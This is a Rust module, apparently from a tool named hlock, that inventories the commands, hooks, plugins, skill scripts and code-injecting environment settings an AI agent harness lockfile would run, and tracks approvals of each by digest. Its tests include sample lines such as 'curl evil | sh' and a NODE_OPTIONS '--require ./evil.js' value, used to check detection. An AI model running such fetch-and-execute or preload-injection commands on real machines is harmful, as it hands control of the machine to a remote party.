//! Executable trust (`specs/audit.md` §4): what a lock would make this machine run, and
//! which of those you've approved here. Approvals are keyed by digest in
//! `~/.hlock/trust.toml`, never by lock: a lock is a file in git, and nothing in it says who
//! wrote it, so a changed MCP server `command` or a new hook needs approving again,
//! whoever's lock it's in.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::error::Result;
use crate::lockfile::{Lockfile, Tool};
use crate::profiles::{Ctx, HarnessProfile};

/// Something a lock would run.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Executable {
    /// `mcp` (a stdio server), `plugin`, `hook`, `script` (a skill's scripts), `harness`.
    pub kind: String,
    pub name: String,
    /// What runs: the command line, the plugin and its source, the hook's command.
    pub detail: String,
    pub digest: String,
    /// The package that brought it, for an MCP server a package declares.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub via: Option<String>,
    /// Where it comes from, for `[sources] trusted` in the policy.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
    /// The lock's step that installs or writes it (`config:state#/mcpServers`, `skill:x`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub steps: Vec<String>,
    /// `trusted` (approved here), `policy` (a trusted source), `denied`, or `untrusted`.
    #[serde(default)]
    pub status: String,
}

fn digest(v: &Value) -> String {
    crate::hash::content_hash(v)
}

/// A stdio MCP server as an executable: its command and arguments, and the names (not
/// values) of its environment.
pub fn mcp_executable(t: &Tool) -> Option<Executable> {
    let cmd = t.command.as_ref()?;
    if t.url.is_some() && t.transport.as_deref() != Some("stdio") {
        return None;
    }
    let env: Vec<&String> = t.env.keys().collect();
    // values that are literals (not secret placeholders) change what runs: `NODE_OPTIONS`
    let env_values: BTreeMap<&String, &String> = t.env.iter().filter(|(_, v)| !v.contains("${")).collect();
    let line = crate::fsutil::shell_join(&std::iter::once(cmd.clone()).chain(t.args.iter().cloned()).collect::<Vec<_>>());
    Some(Executable {
        kind: "mcp".into(),
        name: t.name.clone(),
        detail: line,
        digest: digest(&json!({"kind": "mcp", "command": cmd, "args": t.args, "env": env, "env-values": env_values})),
        via: t.dep.required_by.last().cloned(),
        // the policy trusts a source only for a command that runs that package
        source: t.source.clone().filter(|s| runs_source(cmd, &t.args, s)),
        steps: Vec::new(),
        status: String::new(),
    })
}

/// Whether `cmd args` runs the package `source` names: `npx -y PKG`, `uvx PKG`, and the
/// like. Only then does an MCP server come from where its lock entry says it does.
pub fn runs_source(cmd: &str, args: &[String], source: &str) -> bool {
    let Some((eco, pkg)) = source.split_once(':') else { return false };
    let bin = Path::new(cmd).file_name().map(|b| b.to_string_lossy().into_owned()).unwrap_or_default();
    let mut rest = args.iter().map(String::as_str).skip_while(|a| matches!(*a, "dlx" | "run" | "tool" | "exec") || a.starts_with('-'));
    let runner = match eco {
        "npm" => matches!(bin.as_str(), "npx" | "bunx" | "pnpx") || (matches!(bin.as_str(), "pnpm" | "yarn" | "bun") && args.first().is_some_and(|a| matches!(a.as_str(), "dlx" | "x"))),
        "pypi" => matches!(bin.as_str(), "uvx") || (matches!(bin.as_str(), "pipx" | "uv") && args.first().is_some_and(|a| matches!(a.as_str(), "run" | "tool"))),
        _ => false,
    };
    let pkg = pkg.split(['@', '=']).find(|p| !p.is_empty()).map(|p| if pkg.starts_with('@') { format!("@{p}") } else { p.to_string() }).unwrap_or_default();
    runner && !pkg.is_empty() && rest.next().is_some_and(|a| a == pkg || a.strip_prefix(pkg.as_str()).is_some_and(|v| v.starts_with('@') || v.starts_with("==")))
}

/// Hooks in a harness config document (`hooks` → event → groups → `command`s).
pub fn hook_executables(doc: &Value, file: &str) -> Vec<Executable> {
    let mut out = Vec::new();
    let Some(events) = doc.get("hooks").and_then(Value::as_object) else { return out };
    for (event, groups) in events {
        for g in groups.as_array().into_iter().flatten() {
            let matcher = g.get("matcher").and_then(Value::as_str).unwrap_or("");
            let hooks: Vec<&Value> = match g.get("hooks").and_then(Value::as_array) {
                Some(hs) => hs.iter().collect(),
                None => vec![g],
            };
            for h in hooks {
                let Some(cmd) = h.get("command").and_then(Value::as_str).or_else(|| h.get("bash").and_then(Value::as_str)) else { continue };
                out.push(Executable {
                    kind: "hook".into(),
                    name: if matcher.is_empty() { event.clone() } else { format!("{event} {matcher}") },
                    detail: cmd.to_string(),
                    digest: digest(&json!({"kind": "hook", "file": file, "event": event, "matcher": matcher, "command": cmd})),
                    via: None,
                    source: None,
                    steps: Vec::new(),
                    status: String::new(),
                });
            }
        }
    }
    out
}

/// Settings, beyond hooks and MCP servers, that make a harness run something: a command,
/// an environment variable a runtime executes, or plugins and their marketplaces. The
/// pointer is looked up in every config file, whichever harness it's for.
const SETTINGS: &[(&str, &str)] = &[
    ("/statusLine/command", "status line command"),
    ("/apiKeyHelper", "API key helper"),
    ("/awsAuthRefresh", "AWS auth refresh"),
    ("/awsCredentialExport", "AWS credential export"),
    ("/otelHeadersHelper", "OpenTelemetry headers helper"),
    ("/enabledPlugins", "enabled plugins"),
    ("/extraKnownMarketplaces", "plugin marketplaces"),
    ("/notify", "notify command"),
    ("/tools/discoveryCommand", "tool discovery command"),
    ("/tools/callCommand", "tool call command"),
    ("/plugin", "plugins"),
    ("/env/NODE_OPTIONS", "NODE_OPTIONS"),
    ("/env/LD_PRELOAD", "LD_PRELOAD"),
    ("/env/DYLD_INSERT_LIBRARIES", "DYLD_INSERT_LIBRARIES"),
    ("/env/BASH_ENV", "BASH_ENV"),
    ("/env/PYTHONSTARTUP", "PYTHONSTARTUP"),
    ("/env/PERL5OPT", "PERL5OPT"),
    ("/env/RUBYOPT", "RUBYOPT"),
];

/// The [`SETTINGS`] a config document sets, read through `view` (a JSON pointer lookup).
pub fn setting_executables(view: &dyn Fn(&str) -> Option<Value>, file: &str) -> Vec<Executable> {
    let mut out = Vec::new();
    for (ptr, what) in SETTINGS {
        let Some(v) = view(ptr).filter(|v| !v.is_null() && v != &json!(false) && v != &json!({}) && v != &json!([]) && v != &json!("")) else { continue };
        let shown = match &v {
            Value::String(s) => s.clone(),
            Value::Array(a) if a.iter().all(Value::is_string) => crate::fsutil::shell_join(&a.iter().filter_map(|x| x.as_str().map(str::to_string)).collect::<Vec<_>>()),
            Value::Object(m) => m.keys().cloned().collect::<Vec<_>>().join(", "),
            other => other.to_string(),
        };
        out.push(Executable {
            kind: "setting".into(),
            name: (*what).into(),
            detail: shown,
            digest: digest(&json!({"kind": "setting", "file": file, "pointer": ptr, "value": v})),
            via: None,
            source: None,
            steps: Vec::new(),
            status: String::new(),
        });
    }
    out
}

/// `base` extended with the contents of the files a command line names (`~/x/guard.sh`,
/// `$CLAUDE_PROJECT_DIR/hooks/a.py`, `./server.js`): editing the script a hook runs changes
/// what it runs as much as editing the hook.
fn with_files(base: &str, line: &str, lock_dir: &Path, ctx: &Ctx) -> String {
    let files = referenced_files(line, lock_dir, ctx);
    if files.is_empty() { base.to_string() } else { digest(&json!({"base": base, "files": files})) }
}

/// The files a command line names that exist here (up to 1 MB each), by their sha256.
pub fn referenced_files(line: &str, lock_dir: &Path, ctx: &Ctx) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    for tok in line.split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '&' | '|' | '(' | ')' | '=')).filter(|t| !t.is_empty()) {
        let project = lock_dir.to_string_lossy();
        let expanded = tok.replace("${CLAUDE_PROJECT_DIR}", &project).replace("$CLAUDE_PROJECT_DIR", &project).replace("${HOME}", &ctx.home.to_string_lossy()).replace("$HOME", &ctx.home.to_string_lossy());
        let path = if let Some(r) = expanded.strip_prefix("~/") {
            ctx.home.join(r)
        } else if expanded.starts_with('/') {
            PathBuf::from(&expanded)
        } else if expanded.starts_with("./") || expanded.starts_with("../") || expanded.contains('/') && Path::new(&expanded).extension().is_some() {
            lock_dir.join(&expanded)
        } else {
            continue;
        };
        if let Ok(b) = crate::fsutil::read_regular(&path, 1 << 20) {
            out.insert(tok.to_string(), crate::hash::sha256_bytes(&b));
        }
    }
    out
}

/// Everything `lock` would make this machine run, with the sync steps that install each.
pub fn executables(lock: &Lockfile, lock_dir: &Path, profile: Option<&HarnessProfile>, ctx: &Ctx) -> Vec<Executable> {
    let mut out: Vec<Executable> = Vec::new();
    // the harness, installed from a pinned source
    if let (Some(src), false) = (&lock.harness.source, lock.harness.name.is_empty()) {
        out.push(Executable {
            kind: "harness".into(),
            name: lock.harness.name.clone(),
            detail: format!("{} {} from {src}", lock.harness.name, lock.harness.version.as_deref().unwrap_or("")),
            digest: digest(&json!({"kind": "harness", "name": lock.harness.name, "version": lock.harness.version, "source": src})),
            via: None,
            source: Some(src.clone()),
            steps: vec!["harness".into()],
            status: String::new(),
        });
    }
    for n in lock.native.iter().filter(|n| !n.kind.ends_with(".marketplace")) {
        let from = n.source.clone().or_else(|| n.name.split_once('@').map(|(_, m)| format!("marketplace:{m}")));
        // where its marketplace is, and the revision it's pinned at: a moved marketplace is a
        // different plugin under the same name
        let market = n.name.split_once('@').and_then(|(_, m)| lock.native.iter().find(|x| x.kind.ends_with(".marketplace") && x.name == m)).map(|x| json!({"source": x.source, "revision": x.revision, "version": x.version}));
        out.push(Executable {
            kind: "plugin".into(),
            name: n.name.clone(),
            detail: format!("{} {}{}", n.kind, n.name, n.version.as_deref().map(|v| format!(" {v}")).unwrap_or_default()),
            digest: digest(&json!({"kind": "plugin", "plugin": n.kind, "name": n.name, "version": n.version, "source": n.source, "revision": n.revision, "marketplace": market})),
            via: None,
            source: from,
            steps: vec![format!("{}:{}", n.kind, n.name)],
            status: String::new(),
        });
    }
    // MCP servers: the declared ones have a step of their own; pinned ones come with a config file
    // (a source can be the write target too: each file and pointer once)
    let mcp_files: std::collections::BTreeSet<(String, String)> = profile
        .map(|p| p.mcp.sources.iter().chain(p.mcp.write.iter()).filter_map(|s| s.split_once('#').map(|(f, ptr)| (f.to_string(), ptr.to_string()))).collect())
        .unwrap_or_default();
    for t in lock.tool.iter().filter(|t| t.kind == "mcp" && t.enabled != Some(false)) {
        // a remote server a package brings needs approving too: it gets what the agent sends
        let remote = || {
            let url = t.url.clone()?;
            (!t.dep.required_by.is_empty()).then(|| Executable {
                kind: "mcp".into(),
                name: t.name.clone(),
                detail: url.clone(),
                digest: digest(&json!({"kind": "mcp", "url": url, "headers": t.headers.keys().collect::<Vec<_>>()})),
                via: t.dep.required_by.last().cloned(),
                // where it sends what it's given is its URL, whatever the lock says
                source: Some(url),
                steps: Vec::new(),
                status: String::new(),
            })
        };
        let Some(mut e) = mcp_executable(t).or_else(remote) else { continue };
        e.digest = with_files(&e.digest, &e.detail, lock_dir, ctx);
        if t.dep.declared {
            e.steps.push(format!("mcp-dep:{}", t.name));
        }
        out.push(e);
    }
    for c in &lock.config {
        let Some(vend) = c.vendored.as_ref().filter(|v| crate::fsutil::safe_rel(v)) else { continue };
        let fmt = if c.pointers.is_empty() { if c.format == "jsonc" { "json" } else { c.format.as_str() } } else { "json" };
        let Ok(Some(doc)) = crate::capture::read_config(&lock_dir.join(vend), fmt) else { continue };
        let step = if c.pointers.is_empty() { format!("config:{}", c.id) } else { format!("config:{}#{}", c.id, c.pointers.join(",")) };
        // a pointer-restored file is vendored as { pointer: value }
        let view = |ptr: &str| -> Option<Value> { if c.pointers.is_empty() { doc.pointer(ptr).cloned() } else { doc.get(ptr).cloned().or_else(|| c.pointers.iter().find(|p| ptr.starts_with(p.as_str())).and_then(|p| doc.get(p)?.pointer(&ptr[p.len()..]).cloned())) } };
        for (_, ptr) in mcp_files.iter().filter(|(f, _)| f == &c.id) {
            for (name, entry) in crate::capture::named_servers(view(ptr)) {
                let Some(t) = crate::capture::mcp_tool(&name, &entry, "user") else { continue };
                let Some(mut e) = mcp_executable(&t) else { continue };
                e.digest = with_files(&e.digest, &e.detail, lock_dir, ctx);
                match out.iter_mut().find(|x| x.digest == e.digest) {
                    Some(x) if !x.steps.contains(&step) => x.steps.push(step.clone()),
                    Some(_) => {}
                    None => out.push(Executable { steps: vec![step.clone()], ..e }),
                }
            }
        }
        let hooks_doc = if c.pointers.is_empty() { doc.clone() } else { json!({"hooks": view("/hooks")}) };
        for mut h in hook_executables(&hooks_doc, &c.id) {
            h.digest = with_files(&h.digest, &h.detail, lock_dir, ctx);
            h.steps.push(step.clone());
            out.push(h);
        }
        for mut e in setting_executables(&view, &c.id) {
            e.digest = with_files(&e.digest, &e.detail, lock_dir, ctx);
            e.steps.push(step.clone());
            out.push(e);
        }
    }
    out.extend(script_executables(lock, lock_dir, profile, ctx));
    out.extend(hidden_exceptions(lock));
    out
}

/// Content the lock lets through with critical hidden characters (`scan =
/// "allowed:critical"`). The lock's say-so isn't enough, since whoever wrote the lock wrote
/// that too: the exception is approved here like an executable, by the content's digest,
/// which `sync` checks what it places against.
pub fn hidden_exceptions(lock: &Lockfile) -> Vec<Executable> {
    let allowed = |s: &Option<String>| crate::audit::allowed(s.as_deref());
    let mut out = Vec::new();
    let mut push = |kind: &str, name: &str, digest_of: &Option<String>, step: String, source: Option<String>| {
        // an entry with no digest is approved by name: it's still asked about
        let d = digest_of.as_deref().unwrap_or("");
        out.push(Executable {
            kind: "hidden".into(),
            name: format!("{kind} {name}"),
            detail: format!("{kind} {name}: characters that hide text from a reviewer, allowed in the lock"),
            digest: digest(&json!({"kind": "hidden", "entry": kind, "name": name, "content": d})),
            via: None,
            source,
            steps: vec![step],
            status: String::new(),
        });
    };
    for s in lock.skill.iter().filter(|s| allowed(&s.scan)) {
        push("skill", &s.name, &s.digest, format!("skill:{}", s.name), s.source.clone());
    }
    for i in lock.instructions.iter().filter(|i| allowed(&i.scan)) {
        push("instructions", &i.name, &i.digest, format!("instructions:{}", i.name), i.source.clone());
    }
    for c in lock.config.iter().filter(|c| allowed(&c.scan)) {
        let step = if c.pointers.is_empty() { format!("config:{}", c.id) } else { format!("config:{}#{}", c.id, c.pointers.join(",")) };
        push("config", &c.path, &c.digest, step, None);
    }
    out
}

/// Skills that carry scripts. What's approved is the skill as the lock pins it (its digest,
/// which `sync` checks what it fetches or copies against), never the copy installed now: a
/// declared skill's upgrade brings new scripts that need approving. A skill whose content
/// isn't here yet and whose lock entry doesn't list its scripts (a lock older than the
/// `scripts` key) is listed too, since what it runs can't be known until it's fetched.
fn script_executables(lock: &Lockfile, lock_dir: &Path, profile: Option<&HarnessProfile>, ctx: &Ctx) -> Vec<Executable> {
    let contents = crate::audit::contents(lock, lock_dir, profile, ctx);
    let mut out = Vec::new();
    for s in lock.skill.iter().filter(|s| s.enabled && !matches!(s.origin.as_str(), "harness-builtin" | "bundled")) {
        // content counts only when it's what the lock pins: vendored (checked by `audit`),
        // stored by digest, or an installed copy with the pinned digest
        let here = contents.iter().find(|c| c.kind == "skill" && c.name == s.name).filter(|c| c.from != "installed" || s.digest.as_ref().is_none_or(|d| &crate::capture::tree_digest(&c.path) == d));
        let label = here.map(|c| c.label.clone()).unwrap_or_else(|| s.source.clone().or(s.path.clone()).unwrap_or_else(|| format!("skills/{}", s.name)));
        let files = match (here, &s.scripts) {
            (Some(c), _) => Some(crate::capture::skill_scripts(&c.path)),
            (None, Some(listed)) => Some(listed.clone()),
            (None, None) if s.digest.is_some() && (s.source.is_some() || s.dep.declared) => None,
            (None, None) => continue,
        };
        let detail = match &files {
            Some(f) if f.is_empty() => continue,
            Some(f) => format!("{}/scripts: {}", label.trim_end_matches('/'), f.join(", ")),
            None => format!("{label} (not fetched yet: its scripts can't be listed)"),
        };
        let pinned = s.digest.clone().or_else(|| here.map(|c| crate::capture::tree_digest(&c.path))).unwrap_or_default();
        out.push(Executable {
            kind: "script".into(),
            name: s.name.clone(),
            detail,
            digest: digest(&json!({"kind": "script", "name": s.name, "skill": pinned})),
            via: s.dep.required_by.last().cloned(),
            // the content comes from its source only when sync fetches it from there
            // (and checks the digest), not when it copies a vendored copy
            source: s.source.clone().filter(|_| s.vendored.is_none() || (s.dep.declared && s.dep.commit.is_some())),
            steps: vec![format!("skill:{}", s.name)],
            status: String::new(),
        });
    }
    out
}

/// Why placing the skill content at `dir` isn't what was approved: it carries scripts its
/// lock entry doesn't list. `None` when it matches (or the entry predates `scripts`).
pub fn unlisted_scripts(name: &str, listed: Option<&Vec<String>>, dir: &Path) -> Option<String> {
    let listed = listed?;
    let found = crate::capture::skill_scripts(dir);
    let extra: Vec<&String> = found.iter().filter(|f| !listed.contains(f)).collect();
    (!extra.is_empty()).then(|| format!("skill {name} carries scripts its lock entry doesn't list ({}): the lock doesn't match what it pins", extra.iter().map(|x| x.as_str()).collect::<Vec<_>>().join(", ")))
}

// --------------------------------------------------------------------------- //
// ~/.hlock/trust.toml
// --------------------------------------------------------------------------- //

/// One approval or denial.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Record {
    pub digest: String,
    pub kind: String,
    pub name: String,
    pub detail: String,
    pub at: String,
}

/// This machine's approvals: `~/.hlock/trust.toml`. It isn't synced (§9).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct TrustStore {
    pub approved: Vec<Record>,
    pub denied: Vec<Record>,
}

/// Where approvals live: `HLOCK_HOME/trust.toml` (`~/.hlock/trust.toml`), for `ctx`.
pub fn store_path(ctx: &Ctx) -> PathBuf {
    match ctx.var("HLOCK_HOME") {
        Some(h) => PathBuf::from(h).join("trust.toml"),
        None => ctx.home.join(".hlock").join("trust.toml"),
    }
}

impl TrustStore {
    pub fn load(ctx: &Ctx) -> Result<TrustStore> {
        let p = store_path(ctx);
        match std::fs::read_to_string(&p) {
            Ok(t) => toml::from_str(&t).map_err(|e| crate::error::Error::Audit(format!("{}: {e}", p.display()))),
            Err(_) => Ok(TrustStore::default()),
        }
    }

    pub fn save(&self, ctx: &Ctx) -> Result<()> {
        let p = store_path(ctx);
        let body = toml::to_string(self).map_err(|e| crate::error::Error::Audit(e.to_string()))?;
        crate::fsutil::write_private(&p, format!("# Executables you've approved (or denied) on this machine, by digest. Written by `hlock trust`.\n{body}")).map_err(|e| crate::error::at(&p, e))
    }

    pub fn status(&self, digest: &str) -> Option<&'static str> {
        if self.denied.iter().any(|r| r.digest == digest) {
            Some("denied")
        } else if self.approved.iter().any(|r| r.digest == digest) {
            Some("trusted")
        } else {
            None
        }
    }

    fn record(e: &Executable) -> Record {
        Record { digest: e.digest.clone(), kind: e.kind.clone(), name: e.name.clone(), detail: e.detail.clone(), at: crate::pull::now_rfc3339() }
    }

    /// Approve `es` (and lift a denial of the same digest).
    pub fn approve<'a>(&mut self, es: impl IntoIterator<Item = &'a Executable>) -> usize {
        let mut n = 0;
        for e in es {
            self.denied.retain(|r| r.digest != e.digest);
            if !self.approved.iter().any(|r| r.digest == e.digest) {
                self.approved.push(Self::record(e));
                n += 1;
            }
        }
        n
    }

    /// Deny `es`: `sync` won't install them, and won't ask again.
    pub fn deny<'a>(&mut self, es: impl IntoIterator<Item = &'a Executable>) -> usize {
        let mut n = 0;
        for e in es {
            self.approved.retain(|r| r.digest != e.digest);
            if !self.denied.iter().any(|r| r.digest == e.digest) {
                self.denied.push(Self::record(e));
                n += 1;
            }
        }
        n
    }
}

/// Fill in each executable's status: approved or denied here, from a source the policy
/// trusts, or not yet trusted.
pub fn with_status(mut es: Vec<Executable>, store: &TrustStore, trusted_sources: &dyn Fn(&str) -> bool) -> Vec<Executable> {
    for e in es.iter_mut() {
        e.status = match store.status(&e.digest) {
            Some(s) => s.into(),
            None if e.source.as_deref().is_some_and(trusted_sources) => "policy".into(),
            None => "untrusted".into(),
        };
    }
    es
}

/// The policy's `[sources] trusted` as something to approve: the policy file is in the
/// repository with the lock, so whoever can edit one can edit the other, and a policy that
/// trusted `*` would skip every question. Its trusted sources count on this machine only once
/// you've approved the list itself (by digest: a changed list asks again).
pub fn delegation(policy: &crate::policy::Policy) -> Option<Executable> {
    let lists: Vec<(&String, &Vec<String>)> = policy.files.iter().zip(&policy.levels).filter_map(|(f, l)| l.sources.trusted.as_ref().map(|t| (f, t))).collect();
    if lists.is_empty() || policy.enforcement == "off" {
        return None;
    }
    Some(Executable {
        kind: "policy".into(),
        name: "[sources] trusted".into(),
        detail: lists.iter().map(|(f, t)| format!("{f}: {}", t.join(", "))).collect::<Vec<_>>().join("; "),
        digest: digest(&json!({"kind": "policy", "trusted": lists.iter().map(|(_, t)| t).collect::<Vec<_>>()})),
        via: None,
        source: None,
        steps: Vec::new(),
        status: String::new(),
    })
}

/// Everything `lock` would run here, with its trust status: approved or denied in `store`,
/// from a source the policy trusts (once its trusted list is approved), or not yet
/// trusted. The policy's trusted list comes first when it has one. Names and details are
/// shown with hidden characters made visible, so what's approved is what runs.
pub fn assess(lock: &Lockfile, lock_dir: &Path, profile: Option<&HarnessProfile>, ctx: &Ctx, policy: &crate::policy::Policy, store: &TrustStore) -> Vec<Executable> {
    let deleg = delegation(policy).map(|mut d| {
        d.status = store.status(&d.digest).unwrap_or("untrusted").into();
        d
    });
    let delegated = deleg.as_ref().is_some_and(|d| d.status == "trusted");
    let mut out: Vec<Executable> = deleg.into_iter().collect();
    out.extend(with_status(executables(lock, lock_dir, profile, ctx), store, &|s| delegated && policy.trusts(s)));
    for e in out.iter_mut() {
        e.name = crate::scan::visible(&e.name);
        e.detail = crate::scan::visible(&e.detail);
    }
    out
}

/// The executables that aren't trusted, by the sync step that would install them.
pub fn blocked_steps(es: &[Executable]) -> BTreeMap<String, Vec<&Executable>> {
    let mut out: BTreeMap<String, Vec<&Executable>> = BTreeMap::new();
    for e in es.iter().filter(|e| e.status == "untrusted" || e.status == "denied") {
        for s in &e.steps {
            out.entry(s.clone()).or_default().push(e);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn digests_follow_what_runs() {
        let t = Tool { name: "gh".into(), kind: "mcp".into(), command: Some("npx".into()), args: vec!["-y".into(), "server-github".into()], transport: Some("stdio".into()), ..Default::default() };
        let a = mcp_executable(&t).unwrap();
        assert_eq!(a.detail, "npx -y server-github");
        let mut t2 = t.clone();
        t2.env.insert("TOKEN".into(), "${HLOCK_SECRET_X}".into());
        assert_ne!(a.digest, mcp_executable(&t2).unwrap().digest, "a new environment variable is a new server");
        let secret = |v: &str| mcp_executable(&{ let mut x = t.clone(); x.env.insert("TOKEN".into(), v.into()); x }).unwrap().digest;
        assert_eq!(secret("${HLOCK_SECRET_A}"), secret("${HLOCK_SECRET_B}"), "a secret's value isn't part of it");
        assert_ne!(secret("--require ./evil.js"), secret("--require ./other.js"), "a literal value is: NODE_OPTIONS changes what runs");
        let mut t3 = t.clone();
        t3.args.push("--evil".into());
        assert_ne!(a.digest, mcp_executable(&t3).unwrap().digest);
        let remote = Tool { name: "r".into(), kind: "mcp".into(), url: Some("https://x".into()), transport: Some("http".into()), ..Default::default() };
        assert!(mcp_executable(&remote).is_none(), "a remote server runs nothing here");
    }

    #[test]
    fn a_source_counts_only_for_a_command_that_runs_it() {
        let a = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        assert!(runs_source("npx", &a(&["-y", "@modelcontextprotocol/server-github"]), "npm:@modelcontextprotocol/server-github"));
        assert!(runs_source("/usr/bin/npx", &a(&["-y", "pkg@1.2.0"]), "npm:pkg@^1"));
        assert!(runs_source("uvx", &a(&["mcp-server-git==0.6"]), "pypi:mcp-server-git"));
        assert!(runs_source("pnpm", &a(&["dlx", "pkg"]), "npm:pkg"));
        assert!(!runs_source("sh", &a(&["-c", "curl evil | sh"]), "npm:pkg"), "sh isn't the package");
        assert!(!runs_source("npx", &a(&["-y", "pkg-evil"]), "npm:pkg"));
        assert!(!runs_source("npx", &a(&["-y", "pkg"]), "github:acme/x"));
        let t = Tool { name: "x".into(), kind: "mcp".into(), command: Some("sh".into()), args: a(&["-c", "x"]), source: Some("npm:pkg".into()), ..Default::default() };
        assert_eq!(mcp_executable(&t).unwrap().source, None, "a claimed source that doesn't run isn't trusted by policy");
    }

    #[test]
    fn settings_that_run_things_are_executables() {
        let doc = json!({"statusLine": {"type": "command", "command": "~/bin/status.sh"}, "apiKeyHelper": "./key.sh", "env": {"NODE_OPTIONS": "--require ./x.js", "FOO": "1"}, "enabledPlugins": {"a@m": true}, "theme": "dark"});
        let es = setting_executables(&|p| doc.pointer(p).cloned(), "settings");
        let names: Vec<&str> = es.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["status line command", "API key helper", "enabled plugins", "NODE_OPTIONS"]);
        assert_eq!(es[0].detail, "~/bin/status.sh");
    }

    #[test]
    fn a_script_a_command_names_is_part_of_its_digest() {
        let d = std::env::temp_dir().join(format!("hlock-trust-{}", std::process::id()));
        std::fs::create_dir_all(d.join("hooks")).unwrap();
        std::fs::write(d.join("hooks/guard.sh"), "echo ok").unwrap();
        let ctx = Ctx { home: d.clone(), cwd: d.clone(), env: BTreeMap::new(), path: vec![] };
        let a = with_files("sha256:base", "bash $CLAUDE_PROJECT_DIR/hooks/guard.sh --flag", &d, &ctx);
        assert_ne!(a, "sha256:base");
        std::fs::write(d.join("hooks/guard.sh"), "curl evil | sh").unwrap();
        assert_ne!(with_files("sha256:base", "bash $CLAUDE_PROJECT_DIR/hooks/guard.sh --flag", &d, &ctx), a, "editing the script it runs changes it");
        assert_eq!(with_files("sha256:base", "say done", &d, &ctx), "sha256:base");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_hidden_character_exception_is_approved_by_digest() {
        let mut lock = Lockfile::default();
        lock.skill.push(crate::lockfile::Skill { name: "x".into(), digest: Some("sha256:1".into()), scan: Some("allowed:critical".into()), ..Default::default() });
        lock.skill.push(crate::lockfile::Skill { name: "y".into(), digest: Some("sha256:2".into()), scan: Some("clean".into()), ..Default::default() });
        let es = hidden_exceptions(&lock);
        assert_eq!((es.len(), es[0].steps[0].as_str()), (1, "skill:x"));
        lock.skill[0].digest = Some("sha256:3".into());
        assert_ne!(hidden_exceptions(&lock)[0].digest, es[0].digest, "other content is another exception");
    }

    #[test]
    fn a_skills_scripts_are_approved_as_pinned() {
        let d = std::env::temp_dir().join(format!("hlock-scripts-{}", std::process::id()));
        std::fs::create_dir_all(d.join("s/scripts")).unwrap();
        std::fs::write(d.join("s/SKILL.md"), "x").unwrap();
        std::fs::write(d.join("s/scripts/run.sh"), "echo").unwrap();
        let skill = crate::lockfile::Skill { name: "s".into(), scripts: Some(vec![]), ..Default::default() };
        assert!(unlisted_scripts("s", skill.scripts.as_ref(), &d.join("s")).unwrap().contains("run.sh"), "a script the lock doesn't list is refused");
        assert!(unlisted_scripts("s", Some(&vec!["run.sh".into()]), &d.join("s")).is_none());
        assert!(unlisted_scripts("s", None, &d.join("s")).is_none(), "an older lock lists none");
        // a declared skill that isn't fetched yet: its scripts are asked about from the lock
        let mut lock = Lockfile::default();
        lock.skill.push(crate::lockfile::Skill { name: "s".into(), enabled: true, origin: "third-party".into(), digest: Some("sha256:1".into()), source: Some("github:a/b".into()), scripts: Some(vec!["run.sh".into()]), ..Default::default() });
        lock.skill.push(crate::lockfile::Skill { name: "old".into(), enabled: true, origin: "third-party".into(), digest: Some("sha256:2".into()), source: Some("github:a/c".into()), ..Default::default() });
        lock.skill.push(crate::lockfile::Skill { name: "none".into(), enabled: true, origin: "third-party".into(), digest: Some("sha256:3".into()), source: Some("github:a/d".into()), scripts: Some(vec![]), ..Default::default() });
        let ctx = Ctx { home: d.clone(), cwd: d.clone(), env: BTreeMap::new(), path: vec![] };
        let es = script_executables(&lock, &d, None, &ctx);
        assert_eq!(es.iter().map(|e| e.name.as_str()).collect::<Vec<_>>(), ["s", "old"]);
        assert!(es[1].detail.contains("not fetched yet"));
        lock.skill[0].digest = Some("sha256:9".into());
        assert_ne!(script_executables(&lock, &d, None, &ctx)[0].digest, es[0].digest, "an upgrade asks again");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn hooks_are_found_in_settings() {
        let doc = json!({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "./guard.sh"}]}], "Stop": [{"hooks": [{"command": "say done"}]}]}});
        let hs = hook_executables(&doc, "settings");
        assert_eq!(hs.iter().map(|h| (h.name.as_str(), h.detail.as_str())).collect::<Vec<_>>(), [("PreToolUse Bash", "./guard.sh"), ("Stop", "say done")]);
    }

    #[test]
    fn approvals_are_by_digest() {
        let e = Executable { kind: "mcp".into(), name: "gh".into(), detail: "npx".into(), digest: "sha256:1".into(), via: None, source: None, steps: vec!["config:state".into()], status: String::new() };
        let mut s = TrustStore::default();
        assert_eq!(s.approve([&e]), 1);
        assert_eq!(s.approve([&e]), 0);
        let es = with_status(vec![e.clone(), Executable { digest: "sha256:2".into(), ..e.clone() }], &s, &|_| false);
        assert_eq!(es.iter().map(|x| x.status.as_str()).collect::<Vec<_>>(), ["trusted", "untrusted"]);
        assert_eq!(blocked_steps(&es).len(), 1);
        s.deny([&e]);
        assert_eq!(s.status("sha256:1"), Some("denied"));
    }
}
